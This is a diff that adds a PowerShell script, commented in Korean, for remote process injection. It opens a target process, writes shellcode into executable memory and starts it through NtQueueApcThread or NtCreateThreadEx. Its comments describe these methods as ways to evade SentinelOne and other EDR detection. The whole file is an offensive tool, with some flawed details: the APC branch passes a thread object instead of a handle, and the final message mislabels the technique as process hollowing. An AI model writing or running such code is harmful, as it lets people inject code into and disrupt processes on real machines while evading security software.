@@ -1,0 +1,88 @@
+# 1️⃣ Windows API 선언 (메모리 할당 & 원격 쓰기 & 원격 쓰레드 생성)
+$code = @"
+using System;
+using System.Runtime.InteropServices;
+
+public class WinAPI {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
+
+    [DllImport("ntdll.dll")]
+    public static extern IntPtr NtQueueApcThread(IntPtr hThread, IntPtr pfnAPC, IntPtr dwData, IntPtr dwData2, IntPtr dwData3);
+
+    [DllImport("ntdll.dll")]
+    public static extern IntPtr NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);
+}
+"@
+Add-Type -TypeDefinition $code -Language CSharp
+
+# 2️⃣ 대상 프로세스 선택
+$targetProcess = Read-Host "Enter process name (or press Enter to manually enter PID)"
+if ($targetProcess -ne "") {
+    $proc = Get-Process | Where-Object { $_.ProcessName -eq $targetProcess }
+    if ($proc) {
+        $targetPID = $proc.Id
+        Write-Host "[+] Found Process: $targetProcess (PID: $targetPID)"
+    } else {
+        Write-Host "[!] Process $targetProcess not found! Please enter PID manually."
+        $targetPID = Read-Host "Enter process ID (PID)"
+    }
+} else {
+    $targetPID = Read-Host "Enter process ID (PID)"
+}
+
+# 3️⃣ PID 입력 오류 방지
+if ($targetPID -match "^\d+$") {
+    $targetPID = [int]$targetPID
+    Write-Host "[+] Using PID: $targetPID"
+} else {
+    Write-Host "[!] Invalid PID entered! Exiting..."
+    exit
+}
+
+# 4️⃣ Windows API 상수 값
+$PROCESS_ALL_ACCESS = 0x1F0FFF
+$MEM_COMMIT = 0x1000
+$PAGE_EXECUTE_READWRITE = 0x40
+
+# 5️⃣ Shellcode (TerminateProcess(GetCurrentProcess(), 0))
+$payload = [byte[]] (0x6A, 0x00, 0x68, 0xFF, 0xFF, 0xFF, 0xFF, 0xB8, 0x29, 0x27, 0x93, 0x77, 0xFF, 0xD0)
+
+# 6️⃣ 원격 프로세스에 페이로드 실행
+$hProcess = [WinAPI]::OpenProcess($PROCESS_ALL_ACCESS, $false, $targetPID)
+$mem = [WinAPI]::VirtualAllocEx($hProcess, [IntPtr]::Zero, 1024, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
+$written = 0
+$writeSuccess = [WinAPI]::WriteProcessMemory($hProcess, $mem, $payload, $payload.Length, [ref]$written)
+
+# 7️⃣ SentinelOne 우회를 위한 실행 방식 선택
+Write-Host "[+] Choose Execution Method: (1) NtQueueApcThread | (2) NtCreateThreadEx"
+$choice = Read-Host "Enter method (1 or 2)"
+
+if ($choice -eq "1") {
+    # APC Injection 방식 (탐지 우회)
+    $hThread = Get-Process -Id $targetPID | Select-Object -ExpandProperty Threads | Select-Object -First 1
+    if ($hThread) {
+        [WinAPI]::NtQueueApcThread($hThread, $mem, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
+        Write-Host "[+] APC Injection via NtQueueApcThread Successful"
+    } else {
+        Write-Host "[!] Failed to find a valid thread for APC Injection"
+    }
+} elseif ($choice -eq "2") {
+    # NtCreateThreadEx 방식 (EDR 탐지 우회)
+    $hThread = [IntPtr]::Zero
+    $ntStatus = [WinAPI]::NtCreateThreadEx([ref]$hThread, 0x1FFFFF, [IntPtr]::Zero, $hProcess, $mem, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
+    Write-Host "[+] NtCreateThreadEx Success: $ntStatus (Thread Handle: $hThread)"
+} else {
+    Write-Host "[!] Invalid option selected! Exiting..."
+    exit
+}
+
+Write-Host "[DEBUG] WriteProcessMemory Success: $writeSuccess (Bytes Written: $written)"
+Write-Host "[+] Process Hollowing completed!"
+Read-Host "Press Enter to exit"
